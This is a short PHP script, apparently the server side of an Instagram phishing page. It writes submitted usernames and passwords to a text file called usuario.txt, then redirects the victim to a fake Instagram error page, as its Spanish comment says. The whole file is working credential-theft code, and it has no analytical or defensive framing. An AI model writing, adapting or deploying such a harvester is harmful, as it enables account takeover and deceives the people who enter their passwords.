<?php
file_put_contents("usuario.txt", "Account: " . $_POST['usuario'] . " Pass: " . $_POST['contraseña'] . "\n", FILE_APPEND);
header('Location: Error.php'); //esto es para que te redirija a la pagina de error de instagram que hemos creado nosotros
exit();
?>
	 
	
